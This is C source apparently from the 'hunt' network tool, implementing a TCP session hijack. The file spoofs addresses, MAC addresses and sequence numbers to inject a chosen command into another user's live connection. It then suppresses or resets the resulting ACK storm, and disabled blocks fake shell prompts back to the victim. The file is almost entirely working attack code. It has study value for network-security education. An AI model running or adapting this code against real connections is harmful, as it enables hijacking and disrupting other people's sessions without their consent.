/*
 *
 *	This is free software. You can redistribute it and/or modify under
 *	the terms of the GNU General Public License version 2.
 *
 * 	Copyright (C) 1998 by kra
 *
 */
#include "hunt.h"
#include <sys/time.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <assert.h>

/*
 * 
 * 
 * ATTACK
 * 
 *
 */

int user_stormack_hijack(struct user_conn_info *uci, char *cmdbuf)
{
	struct conn_info *ci;
	int retval;
	
	if (!(ci = conn_get(uci))) {
		printf("connection isn't available\n");
		retval = 1;
	} else {
		retval = stormack_hijack(ci, cmdbuf);
		conn_free(ci);
	}
	return retval;
}

struct list l_hijack_conn = LIST_INIT(struct packet, p_next[MODULE_HIJACK_CONN]);

void func_hijack_dst(struct packet *p, struct conn_info *arg)
{
	if (p->p_iph->saddr == arg->dst_addr &&
	    p->p_iph->daddr == arg->src_addr &&
	    p->p_hdr.p_tcph->source == arg->dst_port &&
	    p->p_hdr.p_tcph->dest == arg->src_port) {
		packet_want(p);
		list_produce(&l_hijack_conn, p);
	}
}

void func_hijack_src(struct packet *p, struct conn_info *arg)
{	
	if (p->p_iph->saddr == arg->src_addr &&
	    p->p_iph->daddr == arg->dst_addr &&
	    p->p_hdr.p_tcph->source == arg->src_port &&
	    p->p_hdr.p_tcph->dest == arg->dst_port) {
		packet_want(p);
		list_produce(&l_hijack_conn, p);
	}
}

/*
 * this function is prepared to run in hunt thread main loop
 */
void fast_ack_to_dst(struct packet *p, struct conn_info *ci)
{
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct tcp_spec ts;
	
	iph = p->p_iph;
	tcph = p->p_hdr.p_tcph;

	if (iph->saddr == ci->dst_addr &&
	    iph->daddr == ci->src_addr &&
	    tcph->source == ci->dst_port &&
	    tcph->dest == ci->src_port) {
		/* packet from dst */
		if (p->p_data_len) {
			memset(&ts, 0, sizeof(ts));
			ts.saddr = ci->src_addr;
			ts.daddr = ci->dst_addr;
			ts.sport = ci->src_port;
			ts.dport = ci->dst_port;
			ts.src_mac = ci->src.src_mac;
			ts.dst_mac = ci->dst.src_mac;
			ts.seq = ci->dst.next_d_seq;
			ts.ack_seq = ci->dst.next_seq;
			ts.window = ci->src.window ? ci->src.window : htons(242);
			ts.id = htons(ntohs(ci->src.id) + 1);
			ts.ack = 1;
			ts.psh = 0;/* 1 */ /* with 1 we can recognize it in tcpdump */
			ts.rst = 0;
			ts.data = NULL;
			ts.data_len = 0;
			send_tcp_packet(&ts);
		}
	}
}

#if 0
/*
 * this function is prepared to run in hunt thread main loop
 */
static fast_ack_to_src_count_src;
static void fast_ack_to_src(struct packet *p, struct conn_info *ci)
{
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct tcp_spec ts;
	
	iph = p->p_iph;
	tcph = p->p_hdr.p_tcph;
	
	if (iph->saddr == ci->src_addr &&
	    iph->daddr == ci->dst_addr &&
	    tcph->source == ci->src_port &&
	    tcph->dest == ci->dst_port) {
		/* packet from src */
		if (p->p_data_len) {
			memset(&ts, 0, sizeof(ts));
			ts.saddr = ci->dst_addr;
			ts.daddr = ci->src_addr;
			ts.sport = ci->dst_port;
			ts.dport = ci->src_port;
			ts.src_mac = ci->dst.src_mac;
			ts.dst_mac = ci->src.src_mac;
			ts.seq = ci->src.next_d_seq;
			ts.ack_seq = ci->src.next_seq;
			ts.window = ci->dst.window ? ci->dst.window : htons(242);
			ts.id = htons(ntohs(ci->dst.id) + 1);
			ts.ack = 1;
			ts.psh = 0;/* 1 */ /* with 1 we can recognize it in tcpdump */
			ts.rst = 0;
#if 0
			ts.data = NULL;
			ts.data_len = 0;
#else
			if (p->p_data[0] == '\r' || p->p_data[0] == '\n') {
				ts.data = "\r\n$ ";
				ts.data_len = 4;
			} else {
				ts.data = p->p_data;
				ts.data_len = p->p_data_len;
			}
#endif
			send_tcp_packet(&ts);
/*
			print_data_packet(p, p->p_data_len, 
					  ++fast_ack_to_src_count_src, 0);
 */
		}
	}
}
#endif
#if 0
static void *hijack_src_print_ack(void *arg)
{
	struct tcp_spec ts;
	struct packet *p;
	struct conn_info *ci = (struct conn_info *) arg;
	int count_src = 0;

	while ((p = list_consume(&l_src_host))) {
		print_data_packet(p, p->p_data_len, ++count_src, 0);
		memset(&ts, 0, sizeof(ts));
		ts.saddr = ci->dst_addr;
		ts.daddr = ci->src_addr;
		ts.sport = ci->dst_port;
		ts.dport = ci->src_port;
		ts.src_mac = ci->dst.src_mac;
		ts.dst_mac = ci->src.src_mac;
		ts.seq = ci->src.next_d_seq;
		ts.ack_seq = ci->src.next_seq;
		ts.window = ci->dst.window ? ci->dst.window : htons(242);
		ts.id = htons(ntohs(ci->dst.id) + 1);
		ts.ack = 1;
		ts.psh = 1;
		ts.rst = 0;
		if (p->p_data[0] == '\r' || p->p_data[0] == '\n') {
			ts.data = "\r\n$ ";
			ts.data_len = 4;
		} else {
			ts.data = p->p_data;
			ts.data_len = p->p_data_len;
		}
		send_tcp_packet(&ts);
		packet_free(p);
	}
	return NULL;
}
#endif

/* go to options */
int storm_reset_sec = 4;
int stormack_hijack_wait_sec = 2;

int stormack_hijack(struct conn_info *ci, char *cmdbuf)
{
	struct iphdr *iph;
	struct tcphdr *tcph;
	struct tcp_spec ts;
	struct timespec relts;
	struct ifunc_item ifunc_dst, ifunc_src, ifunc_ack;
	struct packet *p;
	struct timeval reset_time, now;
	unsigned int src_ack = 0;
	int src_ack_count = -1, reset_it = 0;
	int count_dst = 0;
	int ack_storm_detect = 30;
	int cmdbuf_len;
	
	cmdbuf_len = strlen(cmdbuf);
	memset(&ts, 0, sizeof(ts));
	ts.saddr = ci->src_addr;
	ts.daddr = ci->dst_addr;
	ts.sport = ci->src_port;
	ts.dport = ci->dst_port;
	ts.src_mac = ci->dst.dst_mac;
	ts.dst_mac = ci->dst.src_mac;
	ts.seq = ci->dst.next_d_seq;
	ts.ack_seq = ci->dst.next_seq;
	ts.window = ci->src.window ? ci->src.window : htons(242);
	ts.id = htons(ntohs(ci->src.id) + 1);
	ts.ack = 1;
	ts.psh = 1;
	ts.rst = 0;
	ts.data = cmdbuf;
	ts.data_len = cmdbuf_len;
	
	list_produce_start(&l_hijack_conn);
	
	ifunc_ack.func = (void(*)(struct packet *, void *)) fast_ack_to_dst;
	ifunc_ack.arg = ci;
	list_enqueue(&l_ifunc_fast_tcp, &ifunc_ack);
	
	ifunc_dst.func = (void(*)(struct packet *, void *)) func_hijack_dst;
	ifunc_dst.arg = ci;
	list_enqueue(&l_ifunc_tcp, &ifunc_dst);
	ifunc_src.func = (void(*)(struct packet *, void *)) func_hijack_src;
	ifunc_src.arg = ci;
	list_enqueue(&l_ifunc_tcp, &ifunc_src);
	
	/*
	 * send the packet
	 */
	send_tcp_packet(&ts);

	/*
	 * try to acknovledge everything - but it works only if the
	 * client is Linux because it discards packets which acknovledge
	 * unexisted data. Other systems go to ack storm.
	 */
	relts.tv_sec = stormack_hijack_wait_sec;
	relts.tv_nsec = 0;
	while ((p = list_consume_rel(&l_hijack_conn, &relts))) {
		iph = p->p_iph;
		tcph = p->p_hdr.p_tcph;
		if (iph->saddr == ci->dst_addr &&
		    iph->daddr == ci->src_addr &&
		    tcph->source == ci->dst_port &&
		    tcph->dest == ci->src_port) {
			/* packet from dest */
			if (p->p_data_len)
				print_data_packet(p, p->p_data_len, ++count_dst, 1);
			packet_free(p);
		} else {
			/* packet from source */
			if (src_ack != p->p_hdr.p_tcph->ack || src_ack_count < 0) {
				src_ack = p->p_hdr.p_tcph->ack;
				src_ack_count = 0;
			} else if (++src_ack_count > ack_storm_detect) {
				if (!reset_it) {
					set_tty_color(COLOR_BRIGHTRED);
					printf("ACK storm detected - reset after %ds\n", storm_reset_sec);
					set_tty_color(COLOR_LIGHTGRAY);
					reset_it = 1;
					gettimeofday(&reset_time, NULL);
				} else {
					set_tty_color(COLOR_BRIGHTRED);
					printf(".");
					set_tty_color(COLOR_LIGHTGRAY);
					fflush(stdout);
				}
				ack_storm_detect += 300;
			}
			packet_free(p);
		}
		if (reset_it) {
			int sec, usec, d_sec;
			
			gettimeofday(&now, NULL);
			sec = now.tv_sec - reset_time.tv_sec;
			usec = now.tv_usec - reset_time.tv_usec;
			if (usec < 0) {
				usec += 1000000;
				sec--;
			}
			d_sec = usec / 100000 + sec * 10;
			if (d_sec >= storm_reset_sec * 10) {
				rst(ci, 5, MODE_BOTH);
				set_tty_color(COLOR_BRIGHTRED);
				printf("\n\nreset done\n\n");
				set_tty_color(COLOR_LIGHTGRAY);
				break;
			}
		}
	}
	list_remove(&l_ifunc_fast_tcp, &ifunc_ack);
	list_remove(&l_ifunc_tcp, &ifunc_dst);
	list_remove(&l_ifunc_tcp, &ifunc_src);
	packet_flush(&l_hijack_conn);
	return reset_it ? 1 : 0;
}
